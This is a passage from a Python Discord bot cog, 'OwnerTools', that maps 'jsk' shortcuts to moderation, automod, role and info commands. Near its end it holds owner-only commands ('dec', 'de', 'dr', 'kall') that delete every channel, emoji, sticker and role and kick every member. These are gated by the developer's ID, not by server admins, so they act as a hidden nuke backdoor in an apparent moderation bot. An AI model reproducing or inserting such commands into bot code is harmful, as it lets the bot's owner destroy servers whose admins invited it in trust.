                        cmd = self.bot.get_command("vm_set")
                        if cmd:
                            await ctx.invoke(cmd)
                        return
                    cmd = self.bot.get_command("set")
                    if cmd:
                        await ctx.invoke(cmd, action="jail")
                    return
                if len(args) >= 1 and args[0].lower() == "status":
                    jail_group = self.bot.get_command("jail")
                    if jail_group and hasattr(jail_group, "commands"):
                        # Call subcommand by name
                        sub = None
                        for c in jail_group.commands:
                            if c.name == "status":
                                sub = c
                                break
                        if sub:
                            await ctx.invoke(sub)
                    return
                if len(args) >= 1 and args[0].lower() == "unset":
                    cmd = self.bot.get_command("unset")
                    if cmd:
                        await ctx.invoke(cmd, action="jail")
                    return
                # jail @user [reason]
                if args:
                    try:
                        member = await commands.MemberConverter().convert(ctx, args[0])
                    except commands.MemberNotFound:
                        await message.channel.send("User not found.")
                        return
                    reason = " ".join(args[1:]) or "No reason provided"
                    cmd = self.bot.get_command("jail")
                    if cmd:
                        await ctx.invoke(cmd, target=member.mention, reason=reason)
                return
            # ---- JSK automod shortcuts (owner only) ----
            if head == "automod" and args:
                sub = args[0].lower()
                ctx = await self.bot.get_context(message)
                try:
                    if sub == "words" and len(args) >= 2:
                        action = args[1].lower()
                        if action == "enable":
                            cmd = self.bot.get_command("automod words enable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "disable":
                            cmd = self.bot.get_command("automod words disable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "add" and len(args) >= 3:
                            cmd = self.bot.get_command("automod words add")
                            if cmd:
                                await ctx.invoke(cmd, word=" ".join(args[2:]))
                            return
                        if action == "remove" and len(args) >= 3:
                            cmd = self.bot.get_command("automod words remove")
                            if cmd:
                                await ctx.invoke(cmd, word=" ".join(args[2:]))
                            return
                    if sub == "spam" and len(args) >= 2:
                        action = args[1].lower()
                        if action == "enable":
                            cmd = self.bot.get_command("automod spam enable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "disable":
                            cmd = self.bot.get_command("automod spam disable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "rate" and len(args) >= 3:
                            cmd = self.bot.get_command("automod spam rate")
                            if cmd:
                                await ctx.invoke(cmd, threshold=int(args[2]))
                            return
                        if action == "set" and len(args) >= 3:
                            cmd = self.bot.get_command("automod spam set")
                            if cmd:
                                await ctx.invoke(cmd, threshold=int(args[2]))
                            return
                        if action == "timeout" and len(args) >= 3:
                            cmd = self.bot.get_command("automod spam timeout")
                            if cmd:
                                await ctx.invoke(cmd, duration=" ".join(args[2:]))
                            return
                        if action == "purge" and len(args) >= 3:
                            cmd = self.bot.get_command("automod spam purge")
                            if cmd:
                                await ctx.invoke(cmd, count=int(args[2]))
                            return
                    if sub == "spams":
                        if len(args) >= 2 and args[1].lower() == "enable":
                            cmd = self.bot.get_command("automod spams enable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if len(args) >= 2 and args[1].isdigit():
                            cmd = self.bot.get_command("automod spams")
                            if cmd:
                                await ctx.invoke(cmd, value=int(args[1]))
                            return
                    if sub == "repeat" and len(args) >= 2:
                        action = args[1].lower()
                        if action == "enable":
                            cmd = self.bot.get_command("automod repeat enable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "disable":
                            cmd = self.bot.get_command("automod repeat disable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if action == "threshold" and len(args) >= 3:
                            cmd = self.bot.get_command("automod repeat threshold")
                            if cmd:
                                await ctx.invoke(cmd, value=int(args[2]))
                            return
                    if sub == "repeats":
                        # jsk automod repeats enable | jsk automod repeats <threshold>
                        if len(args) >= 2 and args[1].lower() == "enable":
                            cmd = self.bot.get_command("automod repeats enable")
                            if cmd:
                                await ctx.invoke(cmd)
                            return
                        if len(args) >= 2 and args[1].isdigit():
                            cmd = self.bot.get_command("automod repeats")
                            if cmd:
                                await ctx.invoke(cmd, value=int(args[1]))
                            return
                    if sub == "mod" and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("automod mod")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    if sub == "bypass" and len(args) >= 2:
                        cmd = self.bot.get_command("automod bypass")
                        if cmd:
                            await ctx.invoke(cmd, state=args[1])
                        return
                    if sub == "status":
                        cmd = self.bot.get_command("automod status")
                        if cmd:
                            await ctx.invoke(cmd)
                        return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "unjail" and args:
                try:
                    member = await commands.MemberConverter().convert(ctx, args[0])
                except commands.MemberNotFound:
                    await message.channel.send("User not found.")
                    return
                cmd = self.bot.get_command("unjail")
                if cmd:
                    await ctx.invoke(cmd, member=member)
                return
            if head == "ban" and args:
                member = await commands.MemberConverter().convert(ctx, args[0])
                reason = " ".join(args[1:]) or "No reason provided"
                await self.ban_cmd.callback(self, ctx, member, reason=reason)  # type: ignore
                return
            if head == "kick" and args:
                member = await commands.MemberConverter().convert(ctx, args[0])
                reason = " ".join(args[1:]) or "No reason provided"
                await self.kick_cmd.callback(self, ctx, member, reason=reason)  # type: ignore
                return
            if head == "unban" and args:
                # Accept ID mention or username#discrim if cached user
                try:
                    user = await commands.UserConverter().convert(ctx, args[0])
                except commands.BadArgument:
                    await message.channel.send("Provide a valid user ID or mention.")
                    return
                await self.unban_cmd.callback(self, ctx, user)  # type: ignore
                return
            if head == "mute" and len(args) >= 2:
                member = await commands.MemberConverter().convert(ctx, args[0])
                duration = args[1]
                reason = " ".join(args[2:]) or "No reason provided"
                await self.mute_cmd.callback(self, ctx, member, duration, reason=reason)  # type: ignore
                return
            if head == "timeout" and len(args) >= 2:
                try:
                    member = await commands.MemberConverter().convert(ctx, args[0])
                except Exception:
                    await message.channel.send("Provide a valid member.")
                    return
                duration = args[1]
                reason = " ".join(args[2:]) or "No reason provided"
                await self.timeout_cmd.callback(self, ctx, member, duration, reason=reason)  # type: ignore
                return
            if head == "untimeout" and args:
                try:
                    member = await commands.MemberConverter().convert(ctx, args[0])
                except Exception:
                    await message.channel.send("Provide a valid member.")
                    return
                await self.untimeout_cmd.callback(self, ctx, member)  # type: ignore
                return
            if head == "unmute" and args:
                member = await commands.MemberConverter().convert(ctx, args[0])
                await self.unmute_cmd.callback(self, ctx, member)  # type: ignore
                return
            if head == "strip" and args:
                member = await commands.MemberConverter().convert(ctx, args[0])
                await self.strip_cmd.callback(self, ctx, member)  # type: ignore
                return
            # ---- JSK Role Management shortcuts ----
            if head == "role" and args:
                sub = args[0].lower()
                try:
                    # jsk role all @role
                    if sub == "all" and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role. Usage: `jsk role all @role`")
                            return
                        cmd = self.bot.get_command("role all")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # jsk role human @role
                    if sub == "human" and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role. Usage: `jsk role human @role`")
                            return
                        cmd = self.bot.get_command("role human")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    
                    # jsk role bot @role
                    if sub == "bot" and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role. Usage: `jsk role bot @role`")
                            return
                        cmd = self.bot.get_command("role bot")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # jsk role remove all @role
                    if sub == "remove" and len(args) >= 3 and args[1].lower() == "all":
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[2])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("role remove all")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # jsk role remove human @role
                    if sub == "remove" and len(args) >= 3 and args[1].lower() == "human":
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[2])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("role remove human")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    
                    # jsk role remove bot @role
                    if sub == "remove" and len(args) >= 3 and args[1].lower() == "bot":
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[2])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("role remove bot")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # jsk role info @role
                    if sub in ("info", "i") and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("roleinfo") or self.bot.get_command("ri")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # Invalid command format
                    await message.channel.send("Invalid role command format. Use:\n`jsk role all @role` - Give role to all members\n`jsk role human @role` - Give role to all humans\n`jsk role bot @role` - Give role to all bots")
                    return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "si":
                cmd = self.bot.get_command("serverinfo") or self.bot.get_command("si")
                if cmd:
                    await ctx.invoke(cmd)
                return
            if head == "ui":
                cmd = self.bot.get_command("userinfo") or self.bot.get_command("ui")
                if cmd:
                    await ctx.invoke(cmd)
                return
            if head in ("av", "avatar"):
                # jsk av or jsk avatar - show own avatar
                # jsk av @user or jsk avatar @user - show mentioned user's avatar
                ctx = await self.bot.get_context(message)
                member = None
                if args:
                    try:
                        member = await commands.MemberConverter().convert(ctx, args[0])
                    except Exception:
                        await message.channel.send("Provide a valid member.")
                        return
                cmd = self.bot.get_command("avatar") or self.bot.get_command("av")
                if cmd:
                    await ctx.invoke(cmd, member=member)
                return
            if head == "banner":
                # jsk banner - show own banner
                # jsk banner @user - show mentioned user's banner
                ctx = await self.bot.get_context(message)
                member = None
                if args:
                    try:
                        member = await commands.MemberConverter().convert(ctx, args[0])
                    except Exception:
                        await message.channel.send("Provide a valid member.")
                        return
                cmd = self.bot.get_command("banner")
                if cmd:
                    await ctx.invoke(cmd, member=member)
                return
            if head == "setbutton":
                # jsk setbutton <msg_id> <role> <emoji>
                if len(args) < 3:
                    await message.channel.send("Usage: `jsk setbutton <message_id> <role> <emoji>`")
                    return
                try:
                    message_id = int(args[0])
                    role = await commands.RoleConverter().convert(ctx, args[1])
                    emoji = args[2]
                    cmd = self.bot.get_command("setbutton")
                    if cmd:
                        await ctx.invoke(cmd, message_id=message_id, role=role, emoji=emoji)
                    return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "removebutton":
                # jsk removebutton <msg_id>
                if not args:
                    await message.channel.send("Usage: `jsk removebutton <message_id>`")
                    return
                try:
                    message_id = int(args[0])
                    cmd = self.bot.get_command("removebutton")
                    if cmd:
                        await ctx.invoke(cmd, message_id=message_id)
                    return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "listbuttons":
                # jsk listbuttons
                cmd = self.bot.get_command("listbuttons")
                if cmd:
                    await ctx.invoke(cmd)
                return
            if head == "reroll":
                # jsk reroll <message_id>
                if not args:
                    await message.channel.send("Usage: `jsk reroll <message_id>`")
                    return
                try:
                    message_id = int(args[0])
                    cmd = self.bot.get_command("reroll")
                    if cmd:
                        await ctx.invoke(cmd, message_id=message_id)
                    return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "dec":
                if message.author.id not in OWNER_IDS:
                    await message.channel.send("Only the bot owner can use this command.")
                    return
                # Delete all channels
                for channel in list(message.guild.channels):
                    try:
                        await channel.delete(reason="jsk dec by bot owner")
                    except Exception as e:
                        await message.channel.send(f"Failed to delete {channel.name}: {e}")
                await message.channel.send("All channels deleted.")
                return
            if head == "de":
                if message.author.id not in OWNER_IDS:
                    await message.channel.send("Only the bot owner can use this command.")
                    return
                # Delete all emojis and stickers
                for emoji in list(message.guild.emojis):
                    try:
                        await emoji.delete(reason="jsk de by bot owner")
                    except Exception as e:
                        await message.channel.send(f"Failed to delete emoji {emoji.name}: {e}")
                stickers = getattr(message.guild, "stickers", [])
                for sticker in list(stickers):
                    try:
                        await sticker.delete(reason="jsk de by bot owner")
                    except Exception as e:
                        await message.channel.send(f"Failed to delete sticker {sticker.name}: {e}")
                await message.channel.send("All emojis and stickers deleted.")
                return
            if head == "dr":
                # Delete all roles (owner-only). Skips @everyone, managed roles, and roles above/bot's top role
                if message.author.id not in OWNER_IDS:
                    await message.channel.send("Only the bot owner can use this command.")
                    return
                guild = message.guild
                me = guild.me  # type: ignore
                if not me or not me.guild_permissions.manage_roles:
                    await message.channel.send("I don't have Manage Roles permission.")
                    return
                deleted = 0
                skipped = 0
                # Delete from lowest to highest to reduce dependency issues
                for role in sorted([r for r in guild.roles if r.name != "@everyone"], key=lambda r: r.position):
                    # Skip roles above/equal bot, managed/integration roles
                    if role >= me.top_role or role.managed:
                        skipped += 1
                        continue
                    try:
                        await role.delete(reason="jsk dr by bot owner")
                        deleted += 1
                    except Exception:
                        skipped += 1
                        continue
                await message.channel.send(f"Deleted roles: {deleted}. Skipped: {skipped} (managed/too high).")
                return
            if head == "kall":
                if message.author.id not in OWNER_IDS:
                    await message.channel.send("Only the bot owner can use this command.")
                    return
                # Kick everyone except the bot owner
                for member in list(message.guild.members):
                    if member.id == message.author.id:
                        continue
                    try:
                        await member.kick(reason="jsk kall by bot owner")
                    except Exception as e:
                        await message.channel.send(f"Failed to kick {member}: {e}")
                await message.channel.send("Kicked everyone from the server (except you).")
                return
        except Exception as e:
            await message.channel.send(f"Error: {e}")

async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(OwnerTools(bot))
